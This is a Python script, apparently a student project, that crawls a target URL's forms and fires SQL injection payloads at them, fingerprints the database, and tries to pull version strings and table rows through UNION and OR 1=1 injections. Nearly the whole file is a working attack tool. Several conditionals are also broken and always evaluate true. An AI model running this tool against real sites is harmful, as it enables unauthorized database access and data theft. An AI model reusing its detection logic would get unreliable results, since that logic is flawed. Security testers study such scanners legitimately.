#!/usr/bin/env python3

import requests
import argparse
import json
import sys
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from payloads import payloadsList

database = 'Not found'
database_found = 'False'

def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def get_forms(url):
    try:
        response = requests.get(url)
    except:
        print("Error: connection to the url")
        sys.exit(1)
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find_all("form")

def ft_check_vulnerable(response, result):
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQLite
        ": syntax error",
        "unrecognized token"
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in response.content.decode().lower():
            if database_found == 'False':
                resultCheckDb = ft_check_db(response)
                result.update(resultCheckDb)
            return True
    # no error detected
    return False

def ft_check_db(response):
    result = {}
    global database, database_found
    if database_found == 'False':
        if "mariadb" in response.content.decode().lower():
            database = "MariaDB"
        elif "mysql" in response.content.decode().lower():
            database = "MySQL"
        elif "sqlite" or ": syntax error" or "unrecognized token" in response.content.decode().lower():
            database = "SQLite"
        if database != 'Not found':
            database_found = "True"
        if database_found == 'True':
            result["databases"] = database
    return result

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    if action:
        action = action.lower()
    else:
        action = ''
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload, method):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text" or input_tag["type"] == "search":
            data[input_tag["name"]] = payload
        else:
            data[input_tag["name"]] = "test"
    if method == "POST":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def ft_injection_sql(url, method, form):
    result = {
        "payloads": [],
        "database_version":None
    }
    for p_type in payloadsList:
        for i in payloadsList[p_type]:
            form_details = get_form_details(form)
            response = submit_form(form_details, url, i, method)
            vulnerabilities = ft_check_vulnerable(response, result)
            if not vulnerabilities:
                vulnerabilite_indicator = [
                    "another", "table", "information_schema.tables", "information_schema.columns",
                    "version()", "database()", "user()", "@@version", "group_concat", "table_schema", "ID:", "succesfully logged in."
                ]
                for indicator in vulnerabilite_indicator:
                    if indicator.lower() in response.content.decode().lower():
                        print("Vulnerability located with  \033[91m{}.\033[0m".format(i))
                        result["payloads"].append({
                            "payload": i,
                            "response": response.text
                        })
                        break
                if i == "' UNION SELECT null, null, version(), null##" or "' UNION SELECT sqlite_version(), NULL, NULL, NULL--":
                    if "-mariadb-" in response.content.decode().lower():
                        result["database_version"] = extract_version(response.content.decode())
                if i == "' OR 1=1##" or "' OR 1=1--":
                    if "ID:" in response.content.decode():
                        table_data = extract_table_from_response(response.content.decode())
                        if table_data:
                            result["table"] = table_data

    return result

def extract_version(response_content):
    # Implement a method to extract the version from the response content
    version_indicators = ["version:", "version", "mysql", "mariadb", "sqlite", "sql server"]
    for line in response_content.split('\n'):
        for indicator in version_indicators:
            if indicator in line.lower():
                # Extract the version number from the line
                return line.strip()
    return "Unknown"

def extract_table_from_response(response):
    table_data = []
    table_indicators = ["id:"]
    for line in response.split('\n'):
        for indicator in table_indicators:
            if indicator in line.lower():
                # Extract the version number from the line
                table_data.append(line.strip())
    return table_data

def detect_sql_injection(url, payloads, method):
    forms = get_forms(url)
    results = {
        "url": url,
        "databases": [],
        "database_version": None,
        "vulnerable": False,
        "table": [],
        "payloads": [],
    }

    for form in forms:
        form_details = get_form_details(form)
        for payload in payloads:
            method = method.upper()  # Convertit la m√©thode en majuscules
            response = submit_form(form_details, url, payload, method)
            vulnerabilities = ft_check_vulnerable(response, results)
            if vulnerabilities:
                results["vulnerable"] = True
                results["payloads"].append({
                    "payload": payload,
                    "response": response.text
                })
                resultsqlinjection = ft_injection_sql(url, method, form)
                if "payloads" in results and "payloads" in resultsqlinjection:
                    results["payloads"].extend(resultsqlinjection["payloads"])
                if "database_version" in resultsqlinjection:
                    results["database_version"] = resultsqlinjection["database_version"]
                if "table" in resultsqlinjection:
                    results["table"] = resultsqlinjection["table"]
                if results["vulnerable"]:
                    break
        if results["vulnerable"]:
            break

    return results

def save_results(results, output_file):
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)

def adjust_arguments():
    new_args = []
    for arg in sys.argv[1:]:
        if arg.startswith('-oX'):
            new_args.append('-o')
            new_args.append('default_archive')
            new_args.append('-X')
            new_args.append('GET')
        else:
            new_args.append(arg)
    return new_args

def main():
    sys.argv[1:] = adjust_arguments()
    parser = argparse.ArgumentParser(description='Test for SQL injection vulnerabilities.')
    parser.add_argument('url', type=str, help='URL to test')
    parser.add_argument('-o', type=str, default='default_archive', help='Output file (default: default_archive)')
    parser.add_argument('-X', type=str, default='GET', choices=['GET', 'POST'], help='HTTP method to use (default: GET)')

    args = parser.parse_args()

    print(f"URL: {args.url}")
    print(f"Output file: {args.o}")
    print(f"Method: {args.X}")

    if not is_valid_url(args.url):
        print(f'Invalid URL: {args.url}')
        sys.exit(2)

    payloads = ["'", "\"", "`", "\\", "/*'*/", ")'"]
    results = detect_sql_injection(args.url, payloads, args.X)
    save_results(results, args.o)

    if results["vulnerable"]:
        print("The site is vulnerable to SQL injection.")
    else:
        print("The site is not vulnerable to SQL injection.")

if __name__ == "__main__":
    main()
